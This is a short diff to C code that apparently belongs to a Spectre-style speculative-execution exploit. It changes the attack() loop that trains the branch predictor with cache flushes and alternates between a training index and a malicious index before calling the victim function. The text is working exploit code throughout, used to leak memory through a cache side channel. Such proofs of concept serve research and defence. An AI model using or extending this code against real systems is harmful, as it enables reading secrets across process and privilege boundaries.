@@ -50,20 +50,12 @@ void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
 
     // Train the branch predictor
     int training_x = tries % array1_size;
-    for (int i = 0; i < 30; ++i) {
-      // _mm_clflush(&array2[array1[training_x] * 512]);
-      // _mm_clflush(&array1[training_x]);
+    for (int i = 0; i < 4; ++i) {
       _mm_clflush(&array1_size);
-      // Delay to ensure clflush is effective
       for (volatile int z = 0; z < 100; z++) {}
-      // _mm_mfence();
-
-      // Choose x: training_x for most iterations, malicious_x once
-      x = ((i % 6) - 1) & ~0xFFFF;
-      x = (x | (x >> 16)); // x = 0xffffffff if i%6==0, else 0
-      x = training_x ^ (x & (malicious_x ^ training_x));
-
-      // Call victim with x (sometimes valid, sometimes malicious)
+      // i % 2 - 1 == 0xffff....ffff for i even, 0 for i odd
+      // So x = training_x when i is even, and x = malicious_x when i is odd
+      x = malicious_x ^ ((i % 2 - 1) & (malicious_x ^ training_x));
       victim_function(x);
     }
 
